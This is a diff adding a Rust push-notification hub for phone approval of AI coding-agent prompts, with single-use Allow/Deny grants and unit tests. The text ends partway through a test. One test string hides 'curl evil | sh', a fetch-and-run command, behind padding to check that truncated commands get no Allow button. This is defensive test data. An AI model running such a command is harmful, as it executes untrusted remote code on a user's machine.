@@ -1,0 +1,956 @@
+//! The push state in one place: keys, subscriptions, which phones are looking right now, the
+//! short-lived "Allow / Deny" grants, and the trigger gate. Everything takes `now_ms` so it can be
+//! tested without a clock, and nothing here does network I/O (see `sender.rs`).
+
+use super::store::{Subscription, SubscriptionStore};
+use super::triggers::{coalesced_copy_view, copy_for_view, is_apple_endpoint, shown_in_full, Gate, Kind, PromptInfo, Verdict, View, Words};
+use super::vapid::VapidKeys;
+use base64::engine::general_purpose::URL_SAFE_NO_PAD;
+use base64::Engine;
+use parking_lot::Mutex;
+use serde_json::{json, Value};
+use std::collections::HashMap;
+
+/// A phone that reported itself visible this recently counts as looking at the screen.
+pub const VISIBLE_TTL_MS: u64 = 45_000;
+/// How long an Allow / Deny grant can be redeemed.
+pub const GRANT_TTL_MS: u64 = 10 * 60_000;
+const MAX_GRANTS: usize = 64;
+/// Where the service worker posts an Allow / Deny tap (relative to the PWA origin).
+pub const ACT_PATH: &str = "/bridge/push/act";
+
+/// How the hub learns who is calling. The real one asks the pairing store.
+pub trait DeviceDirectory: Send + Sync {
+    fn device_for_token(&self, token: &str) -> Option<String>;
+    fn device_exists(&self, device_id: &str) -> bool;
+    /// Whether the device may answer approvals (its `answer` ability). A notification only carries
+    /// Allow / Deny for a device that may use them: the tap would be refused anyway.
+    fn device_can_answer(&self, device_id: &str) -> bool;
+}
+
+/// What an Allow / Deny token is good for: one answer to one prompt on one pane, from one device.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct Grant {
+    pub device_id: String,
+    pub pane_id: String,
+    pub prompt_id: String,
+    /// The attention card the notification announced, with the occurrence and screen fingerprint it
+    /// showed. A tap is answered through the same path as the phone card (`attention::answer`), which
+    /// re-reads the live screen and types nothing when it is no longer this prompt. `None` only when
+    /// the attention list had no card yet; the old prompt-id check then guards the tap.
+    pub item: Option<ItemRef>,
+    expires_ms: u64,
+}
+
+/// The attention item a notification is about (the deep link, and what a lock-screen tap answers).
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct ItemRef {
+    /// The opaque item id; the phone opens `/?item=<id>`.
+    pub id: String,
+    pub occurrence: u32,
+    pub fingerprint: String,
+}
+
+/// What the dispatcher wants to tell the phones.
+#[derive(Debug, Clone)]
+pub struct Candidate {
+    pub kind: Kind,
+    /// Rate-limit and tag key: the pane id, or the operation id for a pane-less run.
+    pub key: String,
+    pub pane_id: Option<String>,
+    pub agent_label: String,
+    /// What the sidebar calls the pane (the person's title, else the numbered agent label), the
+    /// first words of the notification title: "auth refactor · Needs you".
+    pub heading: Option<String>,
+    pub prompt: Option<PromptInfo>,
+    /// The attention card this is about, when the list has it.
+    pub item: Option<ItemRef>,
+    /// The one fact a kind adds to its first line (see `triggers::copy_for_view`).
+    pub detail: Option<String>,
+}
+
+/// A notification the rate limit held back instead of dropping: the newest candidate for its key and
+/// how many were held. It is released when the window ends (`PushHub::take_due`).
+#[derive(Debug, Clone)]
+pub struct Held {
+    pub candidate: Candidate,
+    pub count: u32,
+    /// When the window of the notification that went out first ends.
+    pub due_ms: u64,
+}
+
+/// One message for one phone.
+#[derive(Debug, Clone)]
+pub struct Delivery {
+    pub device_id: String,
+    pub subscription: Subscription,
+    pub payload: super::sender::PushPayload,
+    pub urgent: bool,
+    /// The pane the message is about (for dropping it when the prompt is gone).
+    pub pane_id: Option<String>,
+    pub kind: Kind,
+}
+
+pub struct PushHub {
+    vapid: VapidKeys,
+    store: Mutex<SubscriptionStore>,
+    visible_until: Mutex<HashMap<String, u64>>,
+    grants: Mutex<HashMap<String, Grant>>,
+    gate: Mutex<Gate>,
+    /// Notifications the 30 s rate limit held back, by key (pane id, or `q-<id>` for a question).
+    held: Mutex<HashMap<String, Held>>,
+    /// The last notification held back per device because its PWA was on screen.
+    suppressed: Mutex<HashMap<String, (Delivery, u64)>>,
+    /// Held-back notifications released by "hidden" presence reports, waiting to be sent.
+    outbox: Mutex<Vec<Delivery>>,
+    directory: Box<dyn DeviceDirectory>,
+}
+
+impl PushHub {
+    pub fn new(vapid: VapidKeys, store: SubscriptionStore, directory: Box<dyn DeviceDirectory>) -> Self {
+        Self {
+            vapid,
+            store: Mutex::new(store),
+            visible_until: Mutex::new(HashMap::new()),
+            grants: Mutex::new(HashMap::new()),
+            gate: Mutex::new(Gate::default()),
+            held: Mutex::new(HashMap::new()),
+            suppressed: Mutex::new(HashMap::new()),
+            outbox: Mutex::new(Vec::new()),
+            directory,
+        }
+    }
+
+    pub fn vapid(&self) -> &VapidKeys {
+        &self.vapid
+    }
+
+    pub fn gate(&self) -> &Mutex<Gate> {
+        &self.gate
+    }
+
+    pub fn store(&self) -> &Mutex<SubscriptionStore> {
+        &self.store
+    }
+
+    pub fn has_subscribers(&self) -> bool {
+        !self.store.lock().is_empty()
+    }
+
+    pub fn device_for_token(&self, token: &str) -> Option<String> {
+        self.directory.device_for_token(token)
+    }
+
+    // --- presence -----------------------------------------------------------------------------
+
+    /// The phone says whether its PWA is on screen. A `true` expires on its own, so a phone that
+    /// dies without saying goodbye stops suppressing notifications within `VISIBLE_TTL_MS`.
+    /// Returns a notification that was held back while the phone was on screen, if the phone just
+    /// went hidden within `RATE_LIMIT_MS` of it (so a prompt that arrived a moment before the user
+    /// switched away is not lost). It is also queued in the outbox for the sender.
+    pub fn set_visible(&self, device_id: &str, visible: bool, now_ms: u64) -> Option<Delivery> {
+        if visible {
+            self.visible_until.lock().insert(device_id.to_string(), now_ms + VISIBLE_TTL_MS);
+            return None;
+        }
+        let was_visible = self.visible_until.lock().remove(device_id).is_some();
+        let held = self.suppressed.lock().remove(device_id);
+        let (delivery, at) = held?;
+        if !was_visible || now_ms.saturating_sub(at) > super::triggers::RATE_LIMIT_MS {
+            return None;
+        }
+        self.outbox.lock().push(delivery.clone());
+        Some(delivery)
+    }
+
+    /// Notifications released by the phone going hidden; the caller sends them.
+    pub fn take_outbox(&self) -> Vec<Delivery> {
+        std::mem::take(&mut *self.outbox.lock())
+    }
+
+    /// Feed a pane status update through the gate. Leaving `waiting_input` invalidates everything
+    /// that could still answer or announce that prompt: open Allow/Deny grants and held-back pushes.
+    pub fn note_pane_status(&self, pane_id: &str, status: &str) -> Option<Kind> {
+        let kind = self.gate.lock().entered(pane_id, status);
+        if status != "waiting_input" {
+            self.drop_pane_prompts(pane_id);
+        }
+        // A held prompt or error that is no longer true is not announced later.
+        self.held.lock().retain(|key, held| {
+            key != pane_id
+                || match held.candidate.kind {
+                    kind if kind.is_pane_prompt() => status == "waiting_input",
+                    Kind::Error => status == "error",
+                    _ => true,
+                }
+        });
+        kind
+    }
+
+    fn drop_pane_prompts(&self, pane_id: &str) {
+        self.grants.lock().retain(|_, g| g.pane_id != pane_id);
+        self.suppressed
+            .lock()
+            .retain(|_, (d, _)| !(d.kind.is_pane_prompt() && d.pane_id.as_deref() == Some(pane_id)));
+    }
+
+    pub fn is_visible(&self, device_id: &str, now_ms: u64) -> bool {
+        self.visible_until.lock().get(device_id).is_some_and(|until| *until > now_ms)
+    }
+
+    // --- Allow / Deny grants ------------------------------------------------------------------
+
+    fn issue_grant(&self, device_id: &str, pane_id: &str, prompt_id: &str, item: Option<&ItemRef>, now_ms: u64) -> String {
+        let mut grants = self.grants.lock();
+        grants.retain(|_, g| g.expires_ms > now_ms);
+        if grants.len() >= MAX_GRANTS {
+            if let Some(oldest) = grants.iter().min_by_key(|(_, g)| g.expires_ms).map(|(k, _)| k.clone()) {
+                grants.remove(&oldest);
+            }
+        }
+        let secret: [u8; 32] = rand::random();
+        let token = URL_SAFE_NO_PAD.encode(secret);
+        grants.insert(
+            token.clone(),
+            Grant {
+                device_id: device_id.to_string(),
+                pane_id: pane_id.to_string(),
+                prompt_id: prompt_id.to_string(),
+                item: item.cloned(),
+                expires_ms: now_ms + GRANT_TTL_MS,
+            },
+        );
+        token
+    }
+
+    /// Redeem a grant. It is consumed whatever happens next, so a token can answer at most once.
+    pub fn redeem_grant(&self, token: &str, now_ms: u64) -> Result<Grant, &'static str> {
+        let grant = self.grants.lock().remove(token).ok_or("unknown_or_used_token")?;
+        // Answering once settles the prompt: no other grant for this pane may answer a later one.
+        self.grants.lock().retain(|_, g| g.pane_id != grant.pane_id);
+        if grant.expires_ms <= now_ms {
+            return Err("expired_token");
+        }
+        if !self.directory.device_exists(&grant.device_id) {
+            return Err("device_revoked");
+        }
+        Ok(grant)
+    }
+
+    // --- subscriptions ------------------------------------------------------------------------
+
+    /// Drop everything held for a device: its subscription, presence and any open grants.
+    pub fn forget_device(&self, device_id: &str) {
+        if let Err(err) = self.store.lock().remove(device_id) {
+            tracing::warn!(%err, "could not remove a revoked device push subscription");
+        }
+        self.visible_until.lock().remove(device_id);
+        self.grants.lock().retain(|_, g| g.device_id != device_id);
+    }
+
+    // --- deciding and building ----------------------------------------------------------------
+
+    // --- held back by the rate limit ----------------------------------------------------------
+
+    /// A second thing on a pane inside the 30 s window: keep the newest, count it, and remember
+    /// when the window ends. Finished runs are not urgent and are not held.
+    fn hold(&self, candidate: &Candidate, now_ms: u64) {
+        if !candidate.kind.is_urgent() {
+            return;
+        }
+        let due_ms = self.gate.lock().last_sent(&candidate.key).map(|at| at + super::triggers::RATE_LIMIT_MS).unwrap_or(now_ms);
+        let mut held = self.held.lock();
+        let count = held.get(&candidate.key).map_or(0, |h| h.count) + 1;
+        held.insert(candidate.key.clone(), Held { candidate: candidate.clone(), count, due_ms });
+    }
+
+    /// Everything whose window has ended, removed from the hold. The caller decides, from the
+    /// attention list, what is still open (`plan_held`).
+    pub fn take_due(&self, now_ms: u64) -> Vec<Held> {
+        let mut held = self.held.lock();
+        let due: Vec<String> = held.iter().filter(|(_, h)| h.due_ms <= now_ms).map(|(k, _)| k.clone()).collect();
+        due.into_iter().filter_map(|key| held.remove(&key)).collect()
+    }
+
+    /// When the next held notification is due, if any.
+    pub fn next_held_due(&self) -> Option<u64> {
+        self.held.lock().values().map(|h| h.due_ms).min()
+    }
+
+    /// The window ended. `open` is how many blocking things are open on that pane right now:
+    /// none, and nothing is sent; one, and it gets its normal notification; several, and ONE
+    /// summary ("auth refactor · 2 things need you") that never carries a button.
+    pub fn plan_held(&self, held: &Held, open: u32, now_ms: u64) -> (Verdict, Vec<Delivery>) {
+        match open {
+            0 => (Verdict::Resolved, Vec::new()),
+            1 => self.plan(&held.candidate, now_ms),
+            n => {
+                let candidate = &held.candidate;
+                self.gate.lock().mark_sent(now_ms, &candidate.key);
+                let risk = candidate.prompt.as_ref().and_then(|p| p.risk.as_ref());
+                let words = |view| coalesced_copy_view(&candidate.agent_label, candidate.heading.as_deref(), n, risk, view);
+                (Verdict::Send, self.deliveries(candidate, &words, false, now_ms))
+            }
+        }
+    }
+
+    /// Apply the gate (duplicate prompt, 30 s per pane), then build one message per subscribed
+    /// device that is not looking at the PWA right now. A rate-limited candidate is held, not dropped.
+    pub fn plan(&self, candidate: &Candidate, now_ms: u64) -> (Verdict, Vec<Delivery>) {
+        let prompt_id = candidate.prompt.as_ref().map(|p| p.prompt_id.as_str());
+        let verdict = self.gate.lock().admit(now_ms, &candidate.key, candidate.kind, prompt_id);
+        if verdict == Verdict::RateLimited {
+            self.hold(candidate, now_ms);
+        }
+        if verdict != Verdict::Send {
+            return (verdict, Vec::new());
+        }
+        // This one is going out now: whatever was held for the key is covered by it.
+        self.held.lock().remove(&candidate.key);
+        // What the fullest version of the notification says (Android, desktop browsers). It decides
+        // whether Allow / Deny can be offered at all: every phone's own version is cut down from it.
+        let full = copy_for_view(candidate.kind, &candidate.agent_label, candidate.heading.as_deref(), candidate.prompt.as_ref(), candidate.detail.as_deref(), View::Full);
+        // Nothing secret goes to a push service. If redaction changed the text, the body no longer
+        // shows the whole command exactly, so the notification is open-only (no Allow button).
+        let redaction_changed = crate::redact::text(&full.title).as_str() != full.title
+            || crate::redact::text(&full.body).as_str() != full.body
+            || candidate.prompt.as_ref().is_some_and(|p| crate::redact::text(&p.text).as_str() != p.text);
+        // Allow is only offered when the body shows the WHOLE command and cwd: a long command is cut
+        // at 120 characters, and the cut tail could be what actually runs. Then it is open-only.
+        let actionable = candidate.kind == Kind::WaitingInput
+            && candidate.prompt.as_ref().is_some_and(|p| {
+                // Belt and braces: `actionable` already means low risk; check again here.
+                let calm = p.risk.as_ref().is_some_and(|r| r.level == crate::prompt_risk::RiskLevel::Low);
+                p.actionable && calm && shown_in_full(&p.text)
+            })
+            && candidate.pane_id.is_some()
+            && !redaction_changed;
+        let words = |view| {
+            copy_for_view(candidate.kind, &candidate.agent_label, candidate.heading.as_deref(), candidate.prompt.as_ref(), candidate.detail.as_deref(), view)
+        };
+        (verdict, self.deliveries(candidate, &words, actionable, now_ms))
+    }
+
+    /// One message per subscribed phone that is not looking at the PWA right now, each in the words
+    /// that phone gets (`words(view)`): an iPhone's has no command and no buttons (Apple shows no
+    /// action buttons), and a phone with "Hide details on lock screen" on shows no detail at all.
+    /// `actionable` adds Allow / Deny (a one-time grant) for the phones that may answer and read the
+    /// full version.
+    fn deliveries(&self, candidate: &Candidate, words: &dyn Fn(View) -> Words, actionable: bool, now_ms: u64) -> Vec<Delivery> {
+        let prompt_id = candidate.prompt.as_ref().map(|p| p.prompt_id.as_str());
+        let mut deliveries = Vec::new();
+        for (device_id, subscription, hide_details) in self.store.lock().all_with_preferences() {
+            let view = if hide_details {
+                View::Hidden
+            } else if is_apple_endpoint(&subscription.endpoint) {
+                View::Ios
+            } else {
+                View::Full
+            };
+            let words = words(view);
+            let (title, body) = (crate::redact::text(&words.title), crate::redact::text(&words.body));
+            let mut extra = serde_json::Map::new();
+            extra.insert("v".into(), json!(2));
+            extra.insert("kind".into(), json!(candidate.kind.as_str()));
+            extra.insert("tag".into(), json!(format!("pm-{}", candidate.key)));
+            if let Some(pane_id) = &candidate.pane_id {
+                extra.insert("pane_id".into(), Value::String(pane_id.clone()));
+            }
+            if let Some(item) = &candidate.item {
+                // The tap opens this card: `/?item=<id>`.
+                extra.insert("item_id".into(), Value::String(item.id.clone()));
+            }
+            if candidate.kind == Kind::Question {
+                // Version 1 phones open their question list.
+                extra.insert("target".into(), Value::String("questions".into()));
+            }
+            if let (Some(prompt), true) = (&candidate.prompt, candidate.kind.is_pane_prompt()) {
+                extra.insert("prompt_id".into(), Value::String(prompt.prompt_id.clone()));
+            }
+            if actionable && view == View::Full && self.directory.device_can_answer(&device_id) {
+                let pane_id = candidate.pane_id.as_deref().unwrap_or_default();
+                let prompt_id = prompt_id.unwrap_or_default();
+                extra.insert(
+                    "act".into(),
+                    json!({
+                        "url": ACT_PATH,
+                        "token": self.issue_grant(&device_id, pane_id, prompt_id, candidate.item.as_ref(), now_ms),
+                    }),
+                );
+            }
+            let payload = super::sender::PushPayload::new(&title, &body, extra);
+            let delivery = Delivery {
+                device_id: device_id.clone(),
+                subscription,
+                payload,
+                urgent: candidate.kind.is_urgent(),
+                pane_id: candidate.pane_id.clone(),
+                kind: candidate.kind,
+            };
+            if self.is_visible(&device_id, now_ms) {
+                // The phone is looking: hold it back, release it if the phone goes hidden soon.
+                self.suppressed.lock().insert(device_id, (delivery, now_ms));
+            } else {
+                deliveries.push(delivery);
+            }
+        }
+        deliveries
+    }
+}
+
+#[cfg(test)]
+pub(crate) mod testing {
+    use super::*;
+    use std::collections::HashMap;
+
+    /// token -> device id; a device exists while it is in `devices`.
+    pub struct FakeDirectory {
+        pub tokens: Mutex<HashMap<String, String>>,
+        /// Devices paired without the `answer` ability.
+        pub cannot_answer: Mutex<Vec<String>>,
+    }
+
+    impl FakeDirectory {
+        pub fn new(pairs: &[(&str, &str)]) -> Self {
+            Self {
+                tokens: Mutex::new(pairs.iter().map(|(t, d)| (t.to_string(), d.to_string())).collect()),
+                cannot_answer: Mutex::new(Vec::new()),
+            }
+        }
+    }
+
+    impl DeviceDirectory for std::sync::Arc<FakeDirectory> {
+        fn device_for_token(&self, token: &str) -> Option<String> {
+            self.tokens.lock().get(token).cloned()
+        }
+        fn device_exists(&self, device_id: &str) -> bool {
+            self.tokens.lock().values().any(|d| d == device_id)
+        }
+        fn device_can_answer(&self, device_id: &str) -> bool {
+            !self.cannot_answer.lock().iter().any(|d| d == device_id)
+        }
+    }
+
+    pub fn temp_dir(name: &str) -> std::path::PathBuf {
+        std::env::temp_dir().join(format!("pm-push-hub-{name}-{}", std::process::id()))
+    }
+
+    pub fn hub_with(name: &str, directory: std::sync::Arc<FakeDirectory>) -> PushHub {
+        let dir = temp_dir(name);
+        let _ = std::fs::remove_dir_all(&dir);
+        let vapid = VapidKeys::load_or_create(&dir.join("vapid.json")).unwrap();
+        let store = SubscriptionStore::load(dir.join("push.json"), vapid.public_key_b64url());
+        PushHub::new(vapid, store, Box::new(directory))
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::testing::*;
+    use super::*;
+    use crate::push::store::test_subscription;
+    use std::sync::Arc;
+
+    fn low_risk() -> super::super::triggers::PromptRisk {
+        super::super::triggers::PromptRisk { level: crate::prompt_risk::RiskLevel::Low, headline: "Run a command".into() }
+    }
+
+    fn command_prompt(id: &str) -> PromptInfo {
+        PromptInfo { prompt_id: id.into(), text: "Run command: ls".into(), actionable: true, risk: Some(low_risk()) }
+    }
+
+    fn waiting(key: &str, prompt: Option<PromptInfo>) -> Candidate {
+        Candidate { kind: Kind::WaitingInput, key: key.into(), pane_id: Some(key.into()), agent_label: "Kilo".into(), heading: None, prompt, item: None, detail: None }
+    }
+
+    fn two_device_hub(name: &str) -> PushHub {
+        let dir = Arc::new(FakeDirectory::new(&[("tok-a", "dev-a"), ("tok-b", "dev-b")]));
+        let hub = hub_with(name, dir);
+        let (a, _, _) = test_subscription("https://fcm.googleapis.com/a");
+        let (b, _, _) = test_subscription("https://fcm.googleapis.com/b");
+        hub.store().lock().upsert("dev-a", a).unwrap();
+        hub.store().lock().upsert("dev-b", b).unwrap();
+        hub
+    }
+
+    #[test]
+    fn a_visible_phone_is_skipped_and_the_other_still_gets_it() {
+        let hub = two_device_hub("visible");
+        hub.set_visible("dev-a", true, 1_000);
+        let (verdict, deliveries) = hub.plan(&waiting("p1", None), 2_000);
+        assert_eq!(verdict, Verdict::Send);
+        assert_eq!(deliveries.iter().map(|d| d.device_id.as_str()).collect::<Vec<_>>(), ["dev-b"]);
+        // Hidden again, or the heartbeat went stale: it gets notifications.
+        hub.set_visible("dev-a", false, 3_000);
+        assert_eq!(hub.plan(&waiting("p2", None), 4_000).1.len(), 2);
+        hub.set_visible("dev-a", true, 5_000);
+        assert!(hub.is_visible("dev-a", 5_000 + VISIBLE_TTL_MS - 1));
+        assert_eq!(hub.plan(&waiting("p3", None), 5_000 + VISIBLE_TTL_MS).1.len(), 2);
+    }
+
+    #[test]
+    fn payload_is_minimal_and_carries_only_the_parsed_summary() {
+        let hub = two_device_hub("payload");
+        let (_, deliveries) = hub.plan(&waiting("pane-9", Some(command_prompt("pid-1"))), 1_000);
+        let payload: Value = serde_json::from_slice(&deliveries[0].payload).unwrap();
+        assert_eq!(payload["title"], "Kilo · Needs you");
+        assert_eq!(payload["body"], "Low risk · Run a command\nRun command: ls\nKilo");
+        assert_eq!(payload["pane_id"], "pane-9");
+        assert_eq!(payload["prompt_id"], "pid-1");
+        let mut keys: Vec<&str> = payload.as_object().unwrap().keys().map(String::as_str).collect();
+        keys.sort_unstable();
+        assert_eq!(keys, ["act", "body", "kind", "pane_id", "prompt_id", "tag", "title", "v"]);
+    }
+
+    #[test]
+    fn allow_deny_tokens_are_per_device_single_use_prompt_bound_and_expire() {
+        let hub = two_device_hub("grants");
+        let (_, deliveries) = hub.plan(&waiting("pane-1", Some(command_prompt("pid-1"))), 1_000);
+        let token_of = |d: &Delivery| -> String {
+            serde_json::from_slice::<Value>(&d.payload).unwrap()["act"]["token"].as_str().unwrap().to_string()
+        };
+        let (ta, tb) = (token_of(&deliveries[0]), token_of(&deliveries[1]));
+        assert_ne!(ta, tb);
+        let grant = hub.redeem_grant(&ta, 2_000).unwrap();
+        assert_eq!((grant.device_id.as_str(), grant.pane_id.as_str(), grant.prompt_id.as_str()), ("dev-a", "pane-1", "pid-1"));
+        assert_eq!(hub.redeem_grant(&ta, 2_001), Err("unknown_or_used_token"), "single use");
+        assert_eq!(hub.redeem_grant(&tb, 2_002), Err("unknown_or_used_token"), "siblings die with the redeemed grant");
+        let (_, later) = hub.plan(&waiting("pane-2", Some(command_prompt("pid-2"))), 1_000);
+        assert_eq!(hub.redeem_grant(&token_of(&later[0]), 1_000 + GRANT_TTL_MS), Err("expired_token"));
+        assert_eq!(hub.redeem_grant("nonsense", 2_000), Err("unknown_or_used_token"));
+    }
+
+    #[test]
+    fn a_device_without_the_answer_ability_gets_the_notification_but_no_allow_or_deny() {
+        let dir = Arc::new(FakeDirectory::new(&[("tok-a", "dev-a"), ("tok-b", "dev-b")]));
+        dir.cannot_answer.lock().push("dev-a".into());
+        let hub = hub_with("no-answer", dir);
+        let (a, _, _) = test_subscription("https://fcm.googleapis.com/a");
+        let (b, _, _) = test_subscription("https://fcm.googleapis.com/b");
+        hub.store().lock().upsert("dev-a", a).unwrap();
+        hub.store().lock().upsert("dev-b", b).unwrap();
+        let (_, deliveries) = hub.plan(&waiting("pane-1", Some(command_prompt("pid-1"))), 1_000);
+        let payload_of = |id: &str| {
+            let d = deliveries.iter().find(|d| d.device_id == id).expect("both phones are told");
+            serde_json::from_slice::<Value>(&d.payload).unwrap()
+        };
+        assert!(payload_of("dev-a").get("act").is_none(), "watch-only: open-only notification");
+        assert!(payload_of("dev-a")["body"].as_str().is_some_and(|b| !b.is_empty()), "it still says what is happening");
+        assert!(payload_of("dev-b").get("act").is_some(), "a phone that may answer keeps Allow / Deny");
+    }
+
+    #[test]
+    fn a_revoked_device_loses_subscription_presence_and_open_grants() {
+        let dir = Arc::new(FakeDirectory::new(&[("tok-a", "dev-a")]));
+        let hub = hub_with("revoke", dir.clone());
+        let (a, _, _) = test_subscription("https://fcm.googleapis.com/a");
+        hub.store().lock().upsert("dev-a", a).unwrap();
+        let (_, deliveries) = hub.plan(&waiting("p", Some(command_prompt("x"))), 1_000);
+        let token = serde_json::from_slice::<Value>(&deliveries[0].payload).unwrap()["act"]["token"].as_str().unwrap().to_string();
+        hub.forget_device("dev-a");
+        assert!(!hub.has_subscribers());
+        assert_eq!(hub.redeem_grant(&token, 2_000), Err("unknown_or_used_token"));
+        // And even a surviving token is refused once the pairing is gone.
+        let dir2 = Arc::new(FakeDirectory::new(&[("tok-a", "dev-a")]));
+        let hub2 = hub_with("revoke2", dir2.clone());
+        let (a, _, _) = test_subscription("https://fcm.googleapis.com/a");
+        hub2.store().lock().upsert("dev-a", a).unwrap();
+        let (_, d) = hub2.plan(&waiting("p", Some(command_prompt("x"))), 1_000);
+        let token = serde_json::from_slice::<Value>(&d[0].payload).unwrap()["act"]["token"].as_str().unwrap().to_string();
+        dir2.tokens.lock().clear();
+        assert_eq!(hub2.redeem_grant(&token, 2_000), Err("device_revoked"));
+    }
+
+    #[test]
+    fn leaving_waiting_input_kills_the_panes_grants_so_an_old_allow_cannot_hit_a_later_prompt() {
+        let hub = two_device_hub("stale-grant");
+        let token = |d: &Delivery| serde_json::from_slice::<Value>(&d.payload).unwrap()["act"]["token"].as_str().unwrap().to_string();
+        assert_eq!(hub.note_pane_status("p1", "waiting_input"), Some(Kind::WaitingInput));
+        let (_, d) = hub.plan(&waiting("p1", Some(command_prompt("same-hash"))), 1_000);
+        let (ta, tb) = (token(&d[0]), token(&d[1]));
+        // The user denied it at the PC; the pane runs on and later asks the identical question.
+        assert_eq!(hub.note_pane_status("p1", "running"), None);
+        assert_eq!(hub.redeem_grant(&ta, 2_000), Err("unknown_or_used_token"));
+        assert_eq!(hub.redeem_grant(&tb, 2_000), Err("unknown_or_used_token"));
+        // Another pane has its own grants, untouched by p1 leaving.
+        let (_, other) = hub.plan(&waiting("p2", Some(command_prompt("x"))), 1_000);
+        hub.note_pane_status("p1", "idle");
+        assert!(hub.redeem_grant(&token(&other[0]), 2_000).is_ok());
+    }
+
+    #[test]
+    fn redeeming_one_grant_drops_the_panes_other_grants() {
+        let hub = two_device_hub("redeem-siblings");
+        let token = |d: &Delivery| serde_json::from_slice::<Value>(&d.payload).unwrap()["act"]["token"].as_str().unwrap().to_string();
+        let (_, d) = hub.plan(&waiting("p1", Some(command_prompt("h"))), 1_000);
+        assert!(hub.redeem_grant(&token(&d[0]), 2_000).is_ok());
+        assert_eq!(hub.redeem_grant(&token(&d[1]), 2_001), Err("unknown_or_used_token"));
+    }
+
+    #[test]
+    fn a_prompt_held_back_while_visible_is_released_when_the_phone_goes_hidden_soon_after() {
+        let hub = two_device_hub("rearm");
+        hub.set_visible("dev-a", true, 1_000);
+        let (_, d) = hub.plan(&waiting("p1", Some(command_prompt("h"))), 2_000);
+        assert_eq!(d.iter().map(|x| x.device_id.as_str()).collect::<Vec<_>>(), ["dev-b"]);
+        let released = hub.set_visible("dev-a", false, 10_000).expect("released on hide");
+        assert_eq!(released.device_id, "dev-a");
+        assert_eq!(hub.take_outbox().len(), 1);
+        assert!(hub.take_outbox().is_empty());
+        assert!(hub.set_visible("dev-a", false, 11_000).is_none(), "only once");
+    }
+
+    #[test]
+    fn nothing_is_released_after_the_window_or_once_the_prompt_is_gone() {
+        let hub = two_device_hub("rearm-late");
+        hub.set_visible("dev-a", true, 1_000);
+        hub.plan(&waiting("p1", Some(command_prompt("h"))), 2_000);
+        assert!(hub.set_visible("dev-a", false, 2_000 + super::super::triggers::RATE_LIMIT_MS + 1).is_none(), "too late");
+        hub.set_visible("dev-a", true, 100_000);
+        hub.plan(&waiting("p2", Some(command_prompt("h2"))), 101_000);
+        hub.note_pane_status("p2", "waiting_input");
+        hub.note_pane_status("p2", "running"); // answered at the PC meanwhile
+        assert!(hub.set_visible("dev-a", false, 102_000).is_none(), "the prompt is gone");
+    }
+
+    #[test]
+    fn a_long_padded_command_gets_no_allow_deny_but_still_notifies() {
+        let hub = two_device_hub("padded");
+        let padded = format!("Run command: echo ok{}; curl evil | sh (in /repo)", " ".repeat(10).replace(' ', "_").repeat(15));
+        assert!(padded.chars().count() > 120);
+        let prompt = PromptInfo { prompt_id: "pad".into(), text: padded, actionable: true, risk: Some(low_risk()) };
+        let (verdict, d) = hub.plan(&waiting("p1", Some(prompt)), 1_000);
+        assert_eq!(verdict, Verdict::Send);
+        assert_eq!(d.len(), 2);
+        let payload: Value = serde_json::from_slice(&d[0].payload).unwrap();
+        assert!(payload.get("act").is_none(), "truncated command must be open-only");
+        assert!(payload["body"].as_str().unwrap().lines().nth(1).unwrap().ends_with('…'), "the command line is cut");
+        // The same command short enough to show completely does get the buttons.
+        let (_, d) = hub.plan(&waiting("p2", Some(command_prompt("ok"))), 1_000);
+        assert!(serde_json::from_slice::<Value>(&d[0].payload).unwrap().get("act").is_some());
+    }
+
+    #[test]
+    fn only_low_risk_gets_lock_screen_buttons() {
+        use super::super::triggers::PromptRisk;
+        use crate::prompt_risk::RiskLevel;
+        let hub = two_device_hub("only-low");
+        for (i, (level, buttons)) in [(RiskLevel::Low, true), (RiskLevel::Medium, false), (RiskLevel::High, false)].into_iter().enumerate() {
+            let prompt = PromptInfo {
+                prompt_id: format!("p{i}"),
+                text: "Run command: npm install".into(),
+                // Even a wrongly set flag must not produce buttons above low risk.
+                actionable: true,
+                risk: Some(PromptRisk { level, headline: "Install packages".into() }),
+            };
+            let (_, d) = hub.plan(&waiting(&format!("pane-{i}"), Some(prompt)), 1_000 + i as u64);
+            for delivery in &d {
+                let payload: Value = serde_json::from_slice(&delivery.payload).unwrap();
+                assert_eq!(payload.get("act").is_some(), buttons, "{level:?}");
+            }
+        }
+    }
+
+    fn act_of(d: &Delivery) -> Option<Value> {
+        serde_json::from_slice::<Value>(&d.payload).unwrap().get("act").cloned()
+    }
+
+    #[test]
+    fn rate_limited_second_prompt_is_coalesced_not_dropped() {
+        let hub = two_device_hub("coalesce");
+        let (v, d) = hub.plan(&waiting("p1", Some(command_prompt("a"))), 1_000);
+        assert_eq!((v, d.len()), (Verdict::Send, 2));
+        // A different prompt on the same pane four seconds later used to vanish here.
+        let (v, d) = hub.plan(&waiting("p1", Some(command_prompt("b"))), 5_000);
+        assert_eq!((v, d.len()), (Verdict::RateLimited, 0));
+        assert_eq!(hub.next_held_due(), Some(1_000 + super::super::triggers::RATE_LIMIT_MS));
+        assert!(hub.take_due(1_000 + super::super::triggers::RATE_LIMIT_MS - 1).is_empty(), "not before the window ends");
+        let due = hub.take_due(1_000 + super::super::triggers::RATE_LIMIT_MS);
+        assert_eq!(due.len(), 1);
+        assert_eq!(due[0].count, 1);
+        assert!(hub.take_due(u64::MAX).is_empty(), "released once");
+        // One thing is still open: it gets its normal notification, buttons and all.
+        let (v, d) = hub.plan_held(&due[0], 1, 1_000 + super::super::triggers::RATE_LIMIT_MS);
+        assert_eq!((v, d.len()), (Verdict::Send, 2));
+        assert!(act_of(&d[0]).is_some());
+    }
+
+    #[test]
+    fn two_things_open_make_one_summary_without_buttons() {
+        let hub = two_device_hub("coalesce-two");
+        let mut first = waiting("p1", Some(command_prompt("a")));
+        first.heading = Some("auth refactor".into());
+        hub.plan(&first, 1_000);
+        let mut second = waiting("p1", Some(command_prompt("b")));
+        second.heading = Some("auth refactor".into());
+        hub.plan(&second, 2_000);
+        let due = hub.take_due(31_000);
+        let (v, d) = hub.plan_held(&due[0], 2, 31_000);
+        assert_eq!((v, d.len()), (Verdict::Send, 2));
+        let payload: Value = serde_json::from_slice(&d[0].payload).unwrap();
+        assert_eq!(payload["title"], "auth refactor · 2 things need you");
+        assert_eq!(payload["body"], "Low risk · Run a command
+Kilo");
+        assert!(payload.get("act").is_none(), "a summary never carries a button");
